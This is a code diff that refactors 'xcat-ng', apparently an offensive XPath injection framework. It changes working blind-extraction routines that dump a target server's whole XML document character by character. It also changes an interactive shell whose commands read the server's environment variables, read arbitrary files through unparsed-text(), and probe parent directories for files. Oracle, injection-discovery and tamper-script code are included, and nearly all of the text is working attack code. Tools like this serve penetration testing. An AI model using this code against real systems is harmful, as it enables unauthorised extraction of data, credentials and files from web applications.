@@ -618,23 +619,19 @@ async def _get_common_string(ctx: AttackContext,
     return None
 
 
-async def get_string(ctx: AttackContext, expression: str, fast: bool = False) -> str:
+async def get_string(ctx: Ctx, expression: str, fast: bool = False) -> str:
     """
     Mirrors original xcat get_string().
-    Extracts the string value of an XPath expression character by character.
+    Extracts string value of an XPath expression char by char.
     Shows live progress bar on stderr.
     """
-    if ctx.has("normalize-space"):
-        work = f"normalize-space({expression})"
-    else:
-        work = expression
+    work = f"normalize-space({expression})" if ctx.has("normalize-space") else expression
 
-    total = await _string_length(ctx, work)
+    total = await string_length(ctx, work)
     if total <= 0:
         return ""
 
-    # Try common strings cache first
-    cached = await _get_common_string(ctx, work, total)
+    cached = await _try_common_string(ctx, work, total)
     if cached is not None:
         return cached
 
@@ -653,7 +650,7 @@ async def get_string(ctx: AttackContext, expression: str, fast: bool = False) ->
 
     result = "".join(chars)
     if fast and fetch < total:
-        result += f"... ({total - fetch} more)"
+        result += f"... (+{total - fetch} chars)"
     elif total <= 10:
         ctx.common_strs[result] += 1
 
@@ -665,7 +662,7 @@ async def get_string(ctx: AttackContext, expression: str, fast: bool = False) ->
 # ══════════════════════════════════════════════════════════════════════════════
 
 async def exfiltrate_node(
-    ctx:          AttackContext,
+    ctx:          Ctx,
     xpath:        str,
     depth:        int = 0,
     max_depth:    int = 12,
@@ -673,50 +670,50 @@ async def exfiltrate_node(
     xml_lines:    Optional[List[str]] = None,
 ) -> None:
     """
-    Recursively extract an XML node and all its descendants.
-    Mirrors original xcat get_nodes() but:
-      - Prints each tag to stdout immediately (live output)
-      - Accumulates lines in xml_lines for final summary
-      - Progress bars go to stderr
+    Recursively extract an XML subtree.
+    Mirrors original xcat get_nodes() but prints each tag immediately (live).
+    xml_lines accumulates clean XML for final summary.
+    Progress bars go to stderr.
     """
     indent = "  " * depth
+    fast   = ctx.fast_mode
 
-    # Extract node name, attributes, children count in parallel
-    name, attr_count, n_children = await asyncio.gather(
-        get_string(ctx, f"name({xpath})",   fast=ctx.fast_mode),
-        _count(ctx, f"{xpath}/@*"),
-        _count(ctx, f"{xpath}/*"),
+    # Extract name + attr count + child count in parallel
+    name_val, attr_count, n_children = await asyncio.gather(
+        get_string(ctx, f"name({xpath})",  fast=fast),
+        count(ctx, f"{xpath}/@*"),
+        count(ctx, f"{xpath}/*"),
     )
+    if not name_val:
+        name_val = f"node_{depth}"
 
-    if not name:
-        name = f"node_{depth}"
-
-    # Extract attributes in parallel
+    # Extract all attributes in parallel
     attrs: Dict[str, str] = {}
     if attr_count:
-        attr_pairs = await asyncio.gather(*[
+        pairs = await asyncio.gather(*[
             asyncio.gather(
-                get_string(ctx, f"name(({xpath}/@*)[{i}])", fast=ctx.fast_mode),
-                get_string(ctx, f"string(({xpath}/@*)[{i}])", fast=ctx.fast_mode),
+                get_string(ctx, f"name(({xpath}/@*)[{i}])", fast=fast),
+                get_string(ctx, f"string(({xpath}/@*)[{i}])", fast=fast),
             )
             for i in range(1, attr_count + 1)
         ])
-        attrs = {k: v for k, v in attr_pairs if k}
+        attrs = {k: v for k, v in pairs if k}
 
-    attr_str = (" " + " ".join(f'{k}="{v}"' for k, v in attrs.items())) if attrs else ""
-    open_tag = f"{indent}<{name}{attr_str}>"
+    attr_str  = (" " + " ".join(f'{k}="{v}"' for k, v in attrs.items())) if attrs else ""
+    open_tag  = f"{indent}<{name_val}{attr_str}>"
+    close_tag = f"{indent}</{name_val}>"
 
-    # Print open tag immediately
-    print(_c(open_tag, T.CYAN))
+    # Print open tag immediately (live output)
+    print(_c(open_tag, C.CYN))
     if xml_lines is not None:
         xml_lines.append(open_tag)
 
     if n_children == 0 or depth >= max_depth:
-        # Leaf: extract text
-        value = await get_string(ctx, f"string({xpath})", fast=ctx.fast_mode)
-        if value:
-            val_line = f"{indent}  {value}"
-            print(_c(val_line, T.GREEN))
+        # Leaf node: extract text content
+        text = await get_string(ctx, f"string({xpath})", fast=fast)
+        if text:
+            val_line = f"{indent}  {text}"
+            print(_c(val_line, C.GRN))
             if xml_lines is not None:
                 xml_lines.append(val_line)
     else:
@@ -726,8 +723,7 @@ async def exfiltrate_node(
                 depth + 1, max_depth, max_children, xml_lines,
             )
 
-    close_tag = f"{indent}</{name}>"
-    print(_c(close_tag, T.CYAN))
+    print(_c(close_tag, C.CYN))
     if xml_lines is not None:
         xml_lines.append(close_tag)
 
@@ -736,138 +732,112 @@ async def exfiltrate_node(
 # Interactive shell  (mirrors original xcat shell.py)
 # ══════════════════════════════════════════════════════════════════════════════
 
-SHELL_HELP = f"""
-{_c("xcat-ng interactive shell", T.BOLD)}
+SHELL_HELP = """
+\033[1mxcat-ng interactive shell\033[0m
 
-  {_c("get  <xpath>",      T.CYAN)}    Dump XML subtree at XPath expression
-  {_c("get-string <xpath>",T.CYAN)}    Get string value of XPath expression
-  {_c("env  [name]",       T.CYAN)}    List env vars or get specific one
-  {_c("pwd",               T.CYAN)}    Print working directory (base-uri / document-uri)
-  {_c("time",              T.CYAN)}    Print server date/time
-  {_c("cat  <path>",       T.CYAN)}    Read file via unparsed-text()
-  {_c("find <name>",       T.CYAN)}    Search file in parent directories
-  {_c("features",          T.CYAN)}    Show detected feature flags
-  {_c("toggle <feature>",  T.CYAN)}    Toggle a feature on/off
-  {_c("help",              T.CYAN)}    Show this message
-  {_c("exit",              T.CYAN)}    Exit
+  \033[96mget <xpath>\033[0m          Dump XML subtree at XPath
+  \033[96mget-string <xpath>\033[0m   Get string value of XPath expression
+  \033[96menv [name]\033[0m           List all env vars, or get one by name
+  \033[96mpwd\033[0m                  Working directory (base-uri / document-uri)
+  \033[96mtime\033[0m                 Server date/time (current-dateTime)
+  \033[96mcat <path>\033[0m           Read file via unparsed-text()
+  \033[96mfind <filename>\033[0m      Search file in parent directories
+  \033[96mfeatures\033[0m             Show all feature flags
+  \033[96mtoggle <feature>\033[0m     Toggle a feature on/off
+  \033[96mhelp\033[0m                 Show this help
+  \033[96mexit\033[0m                 Quit
 """
 
 
-async def shell_loop(ctx: AttackContext):
+async def shell_loop(ctx: Ctx):
     print(SHELL_HELP)
-
     while True:
         try:
-            line = input(f"{_c('XCat', T.RED)}{_c('$ ', T.GREEN)}").strip()
+            line = input(f"{_c('XCat', C.RED)}{_c('$ ', C.GRN)}").strip()
         except (EOFError, KeyboardInterrupt):
-            print()
-            break
+            print(); break
         if not line:
             continue
-
         parts = shlex.split(line)
         cmd, args = parts[0].lower(), parts[1:]
-
         try:
-            # ── exit ─────────────────────────────────────────────────────────
             if cmd in ("exit", "quit"):
                 break
 
-            # ── help ─────────────────────────────────────────────────────────
             elif cmd == "help":
                 print(SHELL_HELP)
 
-            # ── get ──────────────────────────────────────────────────────────
             elif cmd == "get":
-                if not args:
-                    err("Usage: get <xpath>"); continue
+                if not args: err("Usage: get <xpath>"); continue
                 xml_lines: List[str] = []
                 await exfiltrate_node(ctx, args[0], xml_lines=xml_lines)
                 print()
-                print(_c("═" * 64, T.BOLD))
+                print(_c("═" * 64, C.BOLD))
                 for ln in xml_lines:
-                    s = ln.strip()
-                    print(_c(ln, T.CYAN) if s.startswith("<") else _c(ln, T.GREEN))
-                print(_c("═" * 64, T.BOLD))
+                    print(_c(ln, C.CYN) if ln.strip().startswith("<") else _c(ln, C.GRN))
+                print(_c("═" * 64, C.BOLD))
 
-            # ── get-string ───────────────────────────────────────────────────
             elif cmd == "get-string":
-                if not args:
-                    err("Usage: get-string <xpath>"); continue
-                print(_c(await get_string(ctx, args[0]), T.GREEN))
+                if not args: err("Usage: get-string <xpath>"); continue
+                print(_c(await get_string(ctx, args[0]), C.GRN))
 
-            # ── env ──────────────────────────────────────────────────────────
             elif cmd == "env":
                 if not ctx.has("environment-variables"):
-                    warn("Feature 'environment-variables' not detected"); continue
+                    warn("Feature 'environment-variables' not available"); continue
                 if args:
-                    val = await get_string(ctx, f"environment-variable('{args[0]}')")
-                    print(_c(val, T.GREEN))
+                    print(_c(await get_string(ctx, f"environment-variable('{args[0]}')"), C.GRN))
                 else:
-                    cnt = await _count(ctx, "available-environment-variables()")
-                    for i in range(1, cnt + 1):
+                    n = await count(ctx, "available-environment-variables()")
+                    for i in range(1, n + 1):
                         name = await get_string(ctx, f"available-environment-variables()[{i}]")
                         val  = await get_string(ctx, f"environment-variable('{name}')")
-                        print(f"{_c(name, T.CYAN)}={_c(val, T.GREEN)}")
+                        print(f"{_c(name, C.CYN)}={_c(val, C.GRN)}")
 
-            # ── pwd ──────────────────────────────────────────────────────────
             elif cmd == "pwd":
                 if ctx.has("base-uri"):
-                    print(_c(await get_string(ctx, "base-uri()"), T.GREEN))
+                    print(_c(await get_string(ctx, "base-uri()"), C.GRN))
                 elif ctx.has("document-uri"):
-                    print(_c(await get_string(ctx, "document-uri(/)"), T.GREEN))
+                    print(_c(await get_string(ctx, "document-uri(/)"), C.GRN))
                 else:
-                    warn("Neither base-uri nor document-uri detected")
+                    warn("Neither base-uri nor document-uri available")
 
-            # ── time ─────────────────────────────────────────────────────────
             elif cmd == "time":
                 if not ctx.has("current-datetime"):
-                    warn("Feature 'current-datetime' not detected"); continue
-                print(_c(await get_string(ctx, "string(current-dateTime())"), T.GREEN))
+                    warn("Feature 'current-datetime' not available"); continue
+                print(_c(await get_string(ctx, "string(current-dateTime())"), C.GRN))
 
-            # ── cat ──────────────────────────────────────────────────────────
             elif cmd == "cat":
-                if not args:
-                    err("Usage: cat <path>"); continue
+                if not args: err("Usage: cat <path>"); continue
                 if not ctx.has("unparsed-text"):
-                    warn("Feature 'unparsed-text' not detected"); continue
+                    warn("Feature 'unparsed-text' not available"); continue
                 path = args[0]
                 if not await check(ctx, f"unparsed-text-available('{path}')"):
-                    warn(f"File not available: {path}")
+                    warn(f"File may not be available: {path}")
                     if input("Try anyway? [y/N] ").strip().lower() != "y":
                         continue
-                cnt = await _count(ctx, f"unparsed-text-lines('{path}')")
-                ok(f"Lines: {cnt}")
-                for i in range(1, cnt + 1):
-                    line_val = await get_string(ctx, f"unparsed-text-lines('{path}')[{i}]")
-                    print(line_val)
+                n = await count(ctx, f"unparsed-text-lines('{path}')")
+                for i in range(1, n + 1):
+                    print(await get_string(ctx, f"unparsed-text-lines('{path}')[{i}]"))
 
-            # ── find ─────────────────────────────────────────────────────────
             elif cmd == "find":
-                if not args:
-                    err("Usage: find <filename>"); continue
+                if not args: err("Usage: find <filename>"); continue
                 for i in range(10):
                     rel = ("../" * i) + args[0]
                     expr = f"resolve-uri('{rel}', document-uri(/))"
                     if ctx.has("doc-function") and await check(ctx, f"doc-available({expr})"):
-                        ok(f"[XML] {rel}")
+                        ok(f"[XML ] {rel}")
                     if ctx.has("unparsed-text") and await check(ctx, f"unparsed-text-available({expr})"):
-                        ok(f"[TXT] {rel}")
+                        ok(f"[TEXT] {rel}")
 
-            # ── features ─────────────────────────────────────────────────────
             elif cmd == "features":
                 for k, v in ctx.features.items():
-                    icon = _c("on", T.GREEN) if v else _c("off", T.RED)
-                    print(f"  {k:<34} {icon}")
+                    print(f"  {k:<34} {_c('on', C.GRN) if v else _c('off', C.RED)}")
 
-            # ── toggle ────────────────────────────────────────────────────────
             elif cmd == "toggle":
-                if not args:
-                    err("Usage: toggle <feature>"); continue
+                if not args: err("Usage: toggle <feature>"); continue
                 f = args[0]
                 ctx.features[f] = not ctx.features.get(f, False)
-                state = _c("on", T.GREEN) if ctx.features[f] else _c("off", T.RED)
-                print(f"{f} → {state}")
+                print(f"{f} → {_c('on', C.GRN) if ctx.features[f] else _c('off', C.RED)}")
 
             else:
                 err(f"Unknown command '{cmd}'. Type 'help'.")
@@ -876,47 +846,79 @@ async def shell_loop(ctx: AttackContext):
             print()
         except Exception as exc:
             err(f"Error: {exc}")
-            if _verbose:
+            if VERBOSE:
                 import traceback; traceback.print_exc()
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Oracle  (mirrors original xcat utils.make_match_function — exact same logic)
+# ══════════════════════════════════════════════════════════════════════════════
+
+def make_match_fn(
+    true_string:  Optional[str],
+    true_code:    Optional[str],
+    false_string: Optional[str],
+    false_code:   Optional[str],
+) -> Callable[[int, str], bool]:
+    """
+    Build the oracle function.
+    Mirrors original xcat make_match_function() plus adds --false-string / --false-code.
+
+    TRUE  = XPath condition evaluated to true  (e.g. correct char guessed)
+    FALSE = XPath condition evaluated to false
+
+    --true-string TEXT   response body contains TEXT  → TRUE
+    --true-string !TEXT  response body lacks TEXT     → TRUE
+    --true-code CODE     response status == CODE      → TRUE
+    --true-code !CODE    response status != CODE      → TRUE
+    --false-string TEXT  response body contains TEXT  → FALSE (overrides true)
+    --false-code CODE    response status == CODE      → FALSE (overrides true)
+    """
+    # Parse negation prefix
+    ts_negate = False
+    tc_negate = False
+    if true_string and true_string.startswith("!"):
+        ts_negate, true_string = True, true_string[1:]
+    if true_code and str(true_code).startswith("!"):
+        tc_negate, true_code = True, str(true_code)[1:]
+
+    tc_int = int(true_code)  if true_code  else None
+    fc_int = int(false_code) if false_code else None
+
+    def fn(status: int, body: str) -> bool:
+        # false-string / false-code take priority (explicit FALSE signal)
+        if false_string and false_string in body:
+            return False
+        if fc_int is not None and status == fc_int:
+            return False
+
+        # Check true-code
+        if tc_int is not None:
+            code_match = (status == tc_int)
+            if tc_negate:
+                code_match = not code_match
+            if not code_match:
+                return False
+
+        # Check true-string
+        if true_string is not None:
+            str_match = (true_string in body)
+            if ts_negate:
+                str_match = not str_match
+            if not str_match:
+                return False
+
+        return True
+
+    return fn
 
 
 # ══════════════════════════════════════════════════════════════════════════════
 # Setup helpers
 # ══════════════════════════════════════════════════════════════════════════════
 
-def _make_match_fn(args: argparse.Namespace) -> Callable[[int, str], bool]:
-    """Build oracle function from CLI flags. Mirrors original xcat match_function."""
-    ts     = getattr(args, "true_string",  None)
-    tc     = getattr(args, "true_code",    None)
-    fs     = getattr(args, "false_string", None)
-    fc     = getattr(args, "false_code",   None)
-
-    ts_neg = tc_neg = False
-    if ts and ts.startswith("!"):
-        ts_neg, ts = True, ts[1:]
-    if tc and str(tc).startswith("!"):
-        tc_neg, tc = True, str(tc)[1:]
-
-    tc_int = int(tc) if tc else None
-    fc_int = int(fc) if fc else None
-
-    def fn(status: int, body: str) -> bool:
-        if ts:
-            if (ts in body) ^ ts_neg is False:
-                return False
-        if tc_int is not None:
-            if (status == tc_int) ^ tc_neg is False:
-                return False
-        if fs and fs in body:
-            return False
-        if fc_int and status == fc_int:
-            return False
-        return True
-
-    return fn
-
-
-def _build_context(args: argparse.Namespace) -> AttackContext:
+def build_ctx(args: argparse.Namespace) -> Ctx:
+    # Parse request source
     if getattr(args, "request", None):
         req = ParsedRequest.from_burp(args.request)
     elif getattr(args, "url", None):
@@ -929,36 +931,37 @@ def _build_context(args: argparse.Namespace) -> AttackContext:
             if "=" in p:
                 k, _, v = p.partition("="); params[k] = v
         body: Dict[str, str] = {}
-        for b in (getattr(args, "body_param", None) or []):
+        for b in (getattr(args, "body_params", None) or []):
             if "=" in b:
                 k, _, v = b.partition("="); body[k] = v
-        req = ParsedRequest.from_args(
-            url=args.url, method=args.method,
-            params=params, headers=headers, body=body,
+        req = ParsedRequest(
+            method  = args.method.upper(),
+            url     = args.url,
+            headers = headers,
+            params  = params,
+            body    = body,
         )
     else:
         sys.exit("[-] Provide -r/--request FILE  or  --url URL")
 
-    if not any([
+    # Require at least one oracle flag
+    has_oracle = any([
         getattr(args, "true_string",  None),
         getattr(args, "true_code",    None),
         getattr(args, "false_string", None),
         getattr(args, "false_code",   None),
-    ]):
+    ])
+    if not has_oracle:
         sys.exit(
-            "[-] Specify at least one oracle flag:\n"
-            "    --true-string TEXT    string present in a TRUE response\n"
-            "    --false-string TEXT   string present in a FALSE response\n"
-            "    --true-code CODE      HTTP status for TRUE  (e.g. 200)\n"
-            "    --false-code CODE     HTTP status for FALSE (e.g. 404)"
+            "[-] Need at least one oracle flag:\n"
+            "    --true-string TEXT     text present in a TRUE response\n"
+            "    --true-string '!TEXT'  text absent  in a TRUE response\n"
+            "    --true-code CODE       HTTP status for TRUE  (e.g. 200)\n"
+            "    --false-string TEXT    text present in a FALSE response\n"
+            "    --false-code CODE      HTTP status for FALSE"
         )
 
-    target = getattr(args, "target_param", None) or ""
-    if not target:
-        first = next(iter(req.all_params), None)
-        if first:
-            warn(f"No --param specified, will probe all parameters")
-        target = first or ""
+    target = getattr(args, "param", None) or ""
 
     tamper_fn = None
     if getattr(args, "tamper", None):
@@ -967,43 +970,46 @@ def _build_context(args: argparse.Namespace) -> AttackContext:
         spec.loader.exec_module(mod)
         tamper_fn = getattr(mod, "tamper", None)
 
-    ctx = AttackContext(
-        req=req, target_param=target,
-        match_fn=_make_match_fn(args),
-        concurrency=args.concurrency,
-        fast_mode=getattr(args, "fast", False),
-        timeout=args.timeout,
-        proxy=getattr(args, "proxy", None),
-        tamper_fn=tamper_fn,
+    ctx = Ctx(
+        req          = req,
+        target_param = target,
+        match_fn     = make_match_fn(
+            getattr(args, "true_string",  None),
+            getattr(args, "true_code",    None),
+            getattr(args, "false_string", None),
+            getattr(args, "false_code",   None),
+        ),
+        concurrency  = args.concurrency,
+        fast_mode    = getattr(args, "fast", False),
+        timeout      = args.timeout,
+        proxy        = getattr(args, "proxy", None),
+        tamper_fn    = tamper_fn,
     )
-    for feat in (getattr(args, "enable", None) or []):
-        ctx.features[feat] = True
-    for feat in (getattr(args, "disable", None) or []):
-        ctx.features[feat] = False
-
+    for f in (getattr(args, "enable",  None) or []):
+        ctx.features[f] = True
+    for f in (getattr(args, "disable", None) or []):
+        ctx.features[f] = False
     return ctx
 
 
-async def _setup(ctx: AttackContext) -> bool:
-    """
-    Discover injection, set ctx.target_param + ctx.injection, detect features.
-    Returns True on success.
-    """
+async def setup(ctx: Ctx) -> bool:
+    """Find injection, set ctx.injection + ctx.target_param, detect features."""
+    info("Probing for injection points...")
     result = await auto_discover(ctx)
     if not result:
         err("No injection point found.")
         warn("Tips:")
-        warn("  --true-string TEXT    a string present when XPath condition is TRUE")
-        warn("  --false-string TEXT   a string present when XPath condition is FALSE")
-        warn("  --true-string '!...'  prefix with ! to negate")
-        warn("  -v                    verbose debug output")
+        warn("  --true-string TEXT   text present in response when XPath is TRUE")
+        warn("  --false-string TEXT  text present in response when XPath is FALSE")
+        warn("  --true-string '!X'   negate: TRUE when X is absent")
+        warn("  -v                   show debug output")
         return False
 
     param, inj = result
     ctx.target_param = param
     ctx.injection    = inj
 
-    ok(f"Injection  param={_c(param, T.CYAN)}  type={_c(inj.name, T.YELLOW)}")
+    ok(f"Injection found  param={_c(param, C.CYN)}  type={_c(inj.name, C.YLW)}")
     print(f"  Example : {inj.example}")
     print()
 
@@ -1011,7 +1017,6 @@ async def _setup(ctx: AttackContext) -> bool:
     feats = await detect_features(ctx)
     ctx.features.update(feats)
     print()
-
     return True
 
 
@@ -1020,72 +1025,69 @@ async def _setup(ctx: AttackContext) -> bool:
 # ══════════════════════════════════════════════════════════════════════════════
 
 async def cmd_detect(args: argparse.Namespace):
-    ctx = _build_context(args)
+    ctx = build_ctx(args)
     await ctx.start()
     try:
-        await _setup(ctx)
+        await setup(ctx)
     finally:
         await ctx.close()
 
 
 async def cmd_run(args: argparse.Namespace):
-    ctx = _build_context(args)
+    ctx = build_ctx(args)
     await ctx.start()
     try:
-        if not await _setup(ctx):
+        if not await setup(ctx):
             sys.exit(1)
 
-        info("Extracting XML document  (live output below, progress on stderr)...")
-        print()
-        print(_c("─" * 64, T.GRAY))
+        info("Extracting XML document...")
+        print(_c("─" * 64, C.GRY))
 
         xml_lines: List[str] = []
         try:
             await exfiltrate_node(
-                ctx, "/*", depth=0,
-                max_depth=getattr(args, "max_depth", 12),
-                max_children=getattr(args, "max_children", 40),
-                xml_lines=xml_lines,
+                ctx, "/*",
+                max_depth    = getattr(args, "max_depth",    12),
+                max_children = getattr(args, "max_children", 40),
+                xml_lines    = xml_lines,
             )
         except KeyboardInterrupt:
-            warn("Interrupted — partial result below")
+            warn("Interrupted — partial result:")
 
         print()
-        print(_c("═" * 64, T.BOLD))
-        print(_c("  EXTRACTED XML", T.BOLD))
-        print(_c("═" * 64, T.BOLD))
+        print(_c("═" * 64, C.BOLD))
+        print(_c("  EXTRACTED XML", C.BOLD))
+        print(_c("═" * 64, C.BOLD))
         for ln in xml_lines:
-            s = ln.strip()
-            print(_c(ln, T.CYAN) if s.startswith("<") else _c(ln, T.GREEN))
-        print(_c("═" * 64, T.BOLD))
+            print(_c(ln, C.CYN) if ln.strip().startswith("<") else _c(ln, C.GRN))
+        print(_c("═" * 64, C.BOLD))
 
         if getattr(args, "output", None):
             Path(args.output).write_text("\n".join(xml_lines))
-            ok(f"Saved → {args.output}")
+            ok(f"Saved to {args.output}")
     finally:
         await ctx.close()
 
 
 async def cmd_shell(args: argparse.Namespace):
-    ctx = _build_context(args)
+    ctx = build_ctx(args)
     await ctx.start()
     try:
-        if not await _setup(ctx):
+        if not await setup(ctx):
             sys.exit(1)
         await shell_loop(ctx)
     finally:
         await ctx.close()
 
 
-def cmd_injections(_args: argparse.Namespace):
-    print(_c("Supported injection templates:\n", T.BOLD))
+def cmd_injections(_: argparse.Namespace):
+    print(_c(f"Supported injection templates ({len(INJECTIONS)} total):\n", C.BOLD))
     for i, inj in enumerate(INJECTIONS, 1):
-        payloads = inj.test_payloads("<working_value>")
-        print(f"  {_c(str(i), T.CYAN)}. {inj.name}")
-        print(f"     Example : {_c(inj.example, T.GRAY)}")
-        for pl, expected in payloads:
-            tag = _c("TRUE ", T.GREEN) if expected else _c("FALSE", T.RED)
-            print(f"     {tag}   {pl}")
+        print(f"  {_c(str(i), C.CYN)}. {inj.name}")
+        print(f"     Example : {_c(inj.example, C.GRY)}")
+        for pl, expected in inj.test_payloads("<value>"):
+            tag = _c("TRUE ", C.GRN) if expected else _c("FALSE", C.RED)
+            print(f"     {tag}  {pl}")
         print()
 
 
@@ -1094,171 +1096,91 @@ def cmd_injections(_args: argparse.Namespace):
 # ══════════════════════════════════════════════════════════════════════════════
 
 def _add_common(p: argparse.ArgumentParser):
-    src = p.add_argument_group("Request source  (choose one)")
-    me  = src.add_mutually_exclusive_group()
-    me.add_argument("-r", "--request", metavar="FILE",
-                    help="Burp Suite raw HTTP request file")
-    me.add_argument("--url", metavar="URL",
-                    help="Target URL  (use with --param and --param-values)")
+    src = p.add_argument_group("Request (choose one)")
+    g   = src.add_mutually_exclusive_group()
+    g.add_argument("-r", "--request", metavar="FILE",
+                   help="Burp Suite raw HTTP request file")
+    g.add_argument("--url", metavar="URL",
+                   help="Target URL")
 
-    pg = p.add_argument_group("Parameters  (used with --url)")
-    pg.add_argument("--param", dest="target_param", metavar="NAME",
-                    help="Parameter to inject into (default: probe all)")
-    pg.add_argument("--param-values", nargs="*", metavar="KEY=VALUE",
-                    help="All query/URL parameters  e.g. q=hello page=1")
-    pg.add_argument("--body-param", nargs="*", metavar="KEY=VALUE",
+    pg = p.add_argument_group("Parameters (with --url)")
+    pg.add_argument("--param", metavar="NAME",
+                    help="Parameter to inject (default: probe all)")
+    pg.add_argument("--param-values", nargs="*", metavar="k=v",
+                    help="URL/query parameters  e.g. q=hello id=1")
+    pg.add_argument("--body-params", nargs="*", metavar="k=v",
                     help="POST body parameters")
-    pg.add_argument("-m", "--method", default="GET", metavar="METHOD",
+    pg.add_argument("-m", "--method", default="GET",
                     help="HTTP method (default: GET)")
-    pg.add_argument("--header", nargs="*", metavar="'Name: value'",
+    pg.add_argument("--header", nargs="*", metavar="'Name: val'",
                     help="Extra request headers")
 
     og = p.add_argument_group(
-        "Oracle  (at least one required)",
-        description=(
-            "Define what a TRUE vs FALSE XPath response looks like.\n"
-            "TRUE  = XPath condition matched  (e.g. correct character guessed)\n"
-            "FALSE = XPath condition did not match\n"
-            "Prefix value with ! to negate  (e.g. --true-string '!No results')"
-        ),
+        "Oracle (at least one required)",
+        "TRUE  = XPath condition matched\n"
+        "FALSE = XPath condition did not match\n"
+        "Prefix --true-string / --true-code value with ! to negate",
     )
     og.add_argument("--true-string",  metavar="TEXT",
-                    help="String present in a TRUE response (! to negate)")
+                    help="Text present in a TRUE response (! to negate)")
     og.add_argument("--true-code",    metavar="CODE",
-                    help="HTTP status code for TRUE response (! to negate, e.g. !404)")
+                    help="HTTP status for TRUE response (! to negate)")
     og.add_argument("--false-string", metavar="TEXT",
-                    help="String present in a FALSE response")
+                    help="Text present in a FALSE response")
     og.add_argument("--false-code",   metavar="CODE",
-                    help="HTTP status code for FALSE response")
+                    help="HTTP status for FALSE response")
 
     xo = p.add_argument_group("Options")
     xo.add_argument("-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY,
                     metavar="N", help=f"Concurrent requests (default: {DEFAULT_CONCURRENCY})")
     xo.add_argument("--fast", action="store_true",
-                    help=f"Cap extracted strings at {FAST_MODE_LEN} chars")
+                    help=f"Cap strings at {FAST_MODE_LEN} chars")
     xo.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
-                    metavar="SEC", help=f"Request timeout in seconds (default: {DEFAULT_TIMEOUT})")
+                    metavar="SEC", help=f"Request timeout (default: {DEFAULT_TIMEOUT}s)")
     xo.add_argument("--proxy", metavar="URL",
                     help="HTTP proxy  e.g. http://127.0.0.1:8080")
     xo.add_argument("--tamper", metavar="FILE",
-                    help="Python script to tamper requests (must export tamper(ctx, kwargs))")
+                    help="Tamper script (must export tamper(ctx, kwargs))")
     xo.add_argument("--enable",  nargs="*", metavar="FEATURE",
-                    help="Force-enable a feature (skip detection)")
+                    help="Force-enable features")
     xo.add_argument("--disable", nargs="*", metavar="FEATURE",
-                    help="Force-disable a feature")
+                    help="Force-disable features")
 
 
 def build_parser() -> argparse.ArgumentParser:
     root = argparse.ArgumentParser(
         prog="xcat-ng",
         description=(
-            "xcat-ng  --  Modern XPath Injection Framework (next-generation)\n\n"
+            "xcat-ng — Modern XPath Injection Framework (next-generation)\n\n"
             "Commands:\n"
-            "  detect      Probe parameters, identify injection type and server features\n"
+            "  detect      Find injection point and detect server features\n"
             "  run         Extract the full XML document\n"
-            "  shell       Interactive XPath shell\n"
-            "  injections  List all supported injection templates\n\n"
-            "Use  xcat-ng <command> --help  for per-command details."
+            "  shell       Interactive XPath extraction shell\n"
+            "  injections  List all injection templates\n\n"
+            "xcat-ng <command> --help  for per-command options"
         ),
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
-    root.add_argument("-v", "--verbose", action="store_true",
-                      help="Verbose/debug output")
+    root.add_argument("-v", "--verbose", action="store_true")
     root.add_argument("--version", action="version", version="xcat-ng")
-
     sub = root.add_subparsers(dest="command", required=True)
 
-    # ── detect ────────────────────────────────────────────────────────────────
-    p_detect = sub.add_parser(
-        "detect",
-        help="Find injection point and detect server XPath features",
-        description="""
-DETECT — identify injection and server capabilities
-====================================================
-Tests all parameters with all injection templates.
-Reports working injector type and all detected server features.
-Does NOT extract data. Use 'run' or 'shell' for that.
+    p = sub.add_parser("detect", help="Find injection and detect features",
+                       formatter_class=argparse.RawDescriptionHelpFormatter)
+    _add_common(p)
 
-Examples:
-  xcat-ng detect -r burp.txt --true-string "Results:"
-  xcat-ng detect -r burp.txt --false-string "No Results!"
-  xcat-ng detect -r burp.txt --true-string "Results:" --param q -v
-""",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-    )
-    _add_common(p_detect)
+    p = sub.add_parser("run", help="Extract full XML document",
+                       formatter_class=argparse.RawDescriptionHelpFormatter)
+    _add_common(p)
+    p.add_argument("-o", "--output", metavar="FILE", help="Save XML to file")
+    p.add_argument("--max-depth",    type=int, default=12)
+    p.add_argument("--max-children", type=int, default=40)
 
-    # ── run ───────────────────────────────────────────────────────────────────
-    p_run = sub.add_parser(
-        "run",
-        help="Extract the full XML document from the target",
-        description="""
-RUN — extract the full XML document
-=====================================
-Finds injection, detects features, then extracts the entire XML document
-using boolean blind extraction.
+    p = sub.add_parser("shell", help="Interactive XPath shell",
+                       formatter_class=argparse.RawDescriptionHelpFormatter)
+    _add_common(p)
 
-Character search strategy is auto-selected by detected features:
-  codepoint-search  →  O(log N) via string-to-codepoints (XPath 2.0)
-  substring-search  →  O(log N) via substring-before
-  fallback          →  O(N)  frequency-ordered linear scan
-
-Live output: each XML tag is printed as soon as its name is known.
-A clean summary is printed at the end.
-
-Examples:
-  xcat-ng run -r burp.txt --true-string "Results:"
-  xcat-ng run -r burp.txt --false-string "No Results!" --fast -c 20
-  xcat-ng run -r burp.txt --true-string "Results:" -o extracted.xml
-  xcat-ng run --url http://host/page --param q --param-values q=test \\
-              --true-string "found"
-""",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-    )
-    _add_common(p_run)
-    p_run.add_argument("-o", "--output", metavar="FILE",
-                       help="Save extracted XML to file")
-    p_run.add_argument("--max-depth", type=int, default=12, metavar="N",
-                       help="Max XML tree depth (default: 12)")
-    p_run.add_argument("--max-children", type=int, default=40, metavar="N",
-                       help="Max children per node (default: 40)")
-
-    # ── shell ─────────────────────────────────────────────────────────────────
-    p_shell = sub.add_parser(
-        "shell",
-        help="Interactive XPath extraction shell",
-        description="""
-SHELL — interactive XPath shell
-=================================
-Finds injection, detects features, then opens an interactive shell
-for manual exploration.
-
-Shell commands:
-  get  <xpath>       Dump full XML subtree at XPath
-  get-string <xpath> Get string value of XPath expression
-  env  [name]        List env vars or get specific one
-  pwd                Print working directory
-  time               Print server date/time
-  cat  <path>        Read file via unparsed-text()
-  find <name>        Search file in parent directories
-  features           Show all detected features
-  toggle <feature>   Toggle a feature on/off
-  help               Show all commands
-  exit               Exit
-
-Examples:
-  xcat-ng shell -r burp.txt --true-string "Results:"
-  xcat-ng shell -r burp.txt --false-string "No Results!" --param q
-""",
